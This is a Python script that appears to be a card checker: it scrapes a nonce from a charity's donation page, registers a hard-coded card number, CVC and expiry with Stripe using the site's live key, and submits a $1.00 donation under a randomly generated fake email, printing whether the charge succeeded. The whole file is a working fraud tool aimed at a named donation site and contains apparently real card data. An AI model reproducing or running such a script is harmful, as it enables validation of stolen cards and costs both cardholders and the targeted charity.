import requests
import re
import random
import string

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

async def process_payment():
    user_agent = generate_user_agent()
    acc = generate_random_account()
    r = requests.session()

    # Step 1: Get Nonce for Stripe Transaction
    headers = {
        'authority': 'needhelped.com',
        'user-agent': user_agent,
    }

    r0 = r.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)
    nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', r0.text)
    if not nonce_match:
        return "ERROR: Unable to fetch nonce."

    nonce = nonce_match.group(1)

    # Step 2: Create a Payment Method in Stripe
    headers = {
        'authority': 'api.stripe.com',
        'user-agent': user_agent,
        'content-type': 'application/x-www-form-urlencoded',
    }

    data = {
        'type': 'card',
        'billing_details[email]': acc,
        'card[number]': '4744890115846930',
        'card[cvc]': '378',
        'card[exp_month]': '11',
        'card[exp_year]': '29',
        'key': 'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
    }

    r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    response_json = r1.json()

    if 'id' not in response_json:
        return "ERROR: Payment method creation failed."

    payment_id = response_json['id']
    
    # Step 3: Attempt Donation Payment
    headers = {
        'authority': 'needhelped.com',
        'user-agent': user_agent,
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }

    donation_data = {
        '_charitable_donation_nonce': nonce,
        'campaign_id': '1164',
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'email': acc,
        'gateway': 'stripe',
        'stripe_payment_method': payment_id,
        'action': 'make_donation',
    }

    r2 = r.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=headers, data=donation_data)
    
    if "success" in r2.text:
        return "Payment Successful ✅"
    return "Payment Failed ❌"
